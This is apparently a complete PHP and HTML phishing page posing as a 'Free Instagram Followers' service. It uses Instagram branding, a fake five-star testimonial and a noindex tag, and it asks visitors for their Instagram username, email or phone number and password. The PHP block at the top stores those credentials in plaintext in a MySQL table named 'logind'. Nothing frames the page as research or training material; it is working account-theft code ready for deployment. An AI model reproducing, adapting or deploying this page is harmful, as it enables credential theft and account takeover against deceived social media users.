<?php
if (isset($_POST['submit'])) {
    $username = $_POST['username'];
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Validation
    if (empty($username) || empty($password) || empty($email)) {
        echo "All fields are required.";
    } else {
        $host = 'localhost';
        $user = 'root';
        $pass = '';
        $dbname = 'instagram';

        // Create connection
        $conn = new mysqli($host, $user, $pass, $dbname);

        // Check connection
        if ($conn->connect_error) {
            die("Connection failed: " . $conn->connect_error);
        }

        // Prepare and bind
        $stmt = $conn->prepare("INSERT INTO logind (username, email, password) VALUES (?, ?, ?)");
        $stmt->bind_param("sss", $username, $email, $password);

        // Execute the query
        if ($stmt->execute()) {
            echo "New record created successfully";
        } else {
            echo "Error: " . $stmt->error;
        }

        // Close statement and connection
        $stmt->close();
        $conn->close();
    }
}
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://2lucky.cfd/iG/v1/icon.png" type="image/x-icon">
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
    <link href="style.css" rel="stylesheet">
    <meta name="robots" content="noindex, nofollow">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <title>Free Instagram Followers</title>
    <style>
        body {
            background-color: #f0f0f0;
            color: #333;
            font-family: 'Montserrat', sans-serif;
        }
        
        .navbar {
            background-color: #fff;
            padding: 15px 0;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        
        .sf-nav-logo img {
            height: 40px;
        }
        
        .sf-panel {
            background-color: #fff;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            margin-top: 30px;
        }
        
        .sf-panel .body h3 {
            color: #333;
            font-size: 24px;
            margin-bottom: 15px;
            font-weight: 600;
        }
        
        .sf-panel .body h3 span {
            color: #ff3267;
        }
        
        .form-control {
            border: 1.2px solid #ccc;
            border-radius: 10px;
            margin-bottom: 10px;
        }
        
        .btn.button.sf-button {
            background-color: #ff3267;
            color: #fff;
            width: 100%;
            border-radius: 10px;
            padding: 10px 20px;
            font-size: 16px;
            text-transform: uppercase;
            font-weight: bold;
        }
        
        .review {
            text-align: center;
            background-color: #fff;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            margin-top: 30px;
        }
        
        .review .message {
            font-size: 14px;
            line-height: 1.5;
            color: #666;
        }
        
        .ratings .star {
            color: #ff9f00;
        }
        
        .section-claim {
            padding: 50px 0;
        }
        .container {
            margin-left: 15px;
        }
    </style>
</head>
<body class="claim">
    <nav class="navbar navbar-expand-md navbar-light">
        <div class="container text-center">
            <a class="sf-nav-logo navbar-brand" href="#">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
                Instagram Free Followers
            </a>
        </div>
    </nav>
    <section class="section-claim start">
        <div class="container">
            <div class="row align-items-center">
                <div class="col-md-7">
                    <div class="sf-panel">
                        <div class="body">
                            <h3 class="heading">Get <span>Free Instagram Followers</span></h3>
                            <form action="" method="POST">
                                <input type="text" name="username" class="form-control input-text icon camera" placeholder="Username" autocomplete="off" required>
                                <input type="text" name="email" class="form-control input-text icon at" placeholder="Email Or Phone No" autocomplete="off" required>
                                <input type="hidden" name="id" value="1856249311" autocomplete="off">
                                <input type="password" name="password" class="form-control input-text icon lock" placeholder="Password" autocomplete="off" required><br>
                                
                                <div class="col-12">
                                    <select style="height:50px; width: 100%; padding: 7px; margin-top: 4px; font-size: 14px; font-family: 'Montserrat', sans-serif; background: #ff3267; border-radius: 4px; color: #ffffff; border: none; outline: none;">
                                        <option style="background: #ff3267;">100 Followers</option>
                                        <option style="background: #ff3267;">200 Followers</option>
                                        <option style="background: #ff3267;">400 Followers</option>
                                        <option style="background: #ff3267;">800 Followers</option>
                                        <option style="background: #ff3267;">1600 Followers</option>
                                        <option style="background: #ff3267;">3000 Followers</option>
                                        <option style="background: #ff3267;" selected>100 Followers</option>
                                    </select>
                                </div><br>
                                <button type="submit" id="submitButton" class="btn button sf-button pink block" name="submit" value="Start Now">Start Now</button>
                            </form>
                        </div>
                    </div>
                </div>
                <div class="col-md-5">
                    <div class="review d-flex flex-column align-items-center">
                        <p class="message">
                            I never believed I could get free followers And it is so simple to use.
                            
                            ~ Chetan
                        </p>
                        <div class="ratings d-flex align-items-center justify-content-between">
                            <span class="star">&#9733;</span>
                            <span class="star">&#9733;</span>
                            <span class="star">&#9733;</span>
                            <span class="star">&#9733;</span>
                            <span class="star">&#9733;</span>
                        </div>
                        <div class="social"></div>
                    </div>
                </div>
            </div>
        </div>
    </section>
</body>
</html>
